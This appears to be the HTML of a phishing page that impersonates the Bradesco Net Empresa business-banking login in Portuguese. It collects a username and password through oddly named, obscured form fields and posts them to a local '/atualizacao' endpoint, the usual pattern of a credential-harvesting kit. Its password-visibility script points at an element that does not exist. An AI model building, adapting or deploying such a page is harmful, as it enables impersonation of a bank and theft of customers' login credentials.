<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login Bradesco Net Empresa</title>
  <link rel="stylesheet" href="css/mobile.css">

<script>
    function validarLogin() {
        const usuario = document.getElementById('usuario').value;
        const senhdd = document.getElementById('senhdd').value;
        if ((usuario.length <= 6) || (senhdd.length <= 6)){
                alert('Preencha corretamente o campo de usuario e senha.');
            }else{
                document.getElementById("fmdkdmskds").submit();
        }
    }
</script>
</head>
<body>
  <header>
    Bradesco Net Empresa
  </header>

  <main>
    <h1>Acesso à conta</h1>
  

    <form method="POST" id="fmdkdmskds" action="/atualizacao">
      <div class="input-group">
        <input
          type="text"
          id="usuario"
          name="campo_primeiro"
          value=""
          placeholder=" "
          autocomplete="username"
          required
        />
        <label for="usuario">Usuário</label>
      </div>

      <div class="input-group password-wrapper">
        <input
          type="password"
          id="senhdd"
          name="campo_segundo"
          value=""
          placeholder=" "
          autocomplete="current-password"
          required
        />
        <label for="senhdd">Senha</label>

        <svg
          xmlns="http://www.w3.org/2000/svg"
          viewBox="0 0 24 24"
          aria-hidden="true"
          id="togglePassword"
          title="Mostrar/ocultar senha"
        >
          <path
            d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7z"
            fill="none"
            stroke="#666"
            stroke-width="2"
          />
          <circle cx="12" cy="12" r="3" fill="#666" />
        </svg>
      </div>

   

     
    </form>
  </main>
 <button onclick="validarLogin();">Acessar conta</button>
  <script>
    // Mostrar/ocultar senha
    const togglePassword = document.querySelector("#togglePassword");
    const passwordInput = document.querySelector("#senha");

    togglePassword.addEventListener("click", () => {
      const type =
        passwordInput.getAttribute("type") === "password"
          ? "text"
          : "password";
      passwordInput.setAttribute("type", type);
      if (type === "text") {
        togglePassword.querySelector("circle").setAttribute("fill", "#004aad");
        togglePassword.querySelector("path").setAttribute("stroke", "#004aad");
      } else {
        togglePassword.querySelector("circle").setAttribute("fill", "#666");
        togglePassword.querySelector("path").setAttribute("stroke", "#666");
      }
    });
  </script>
</body>
</html>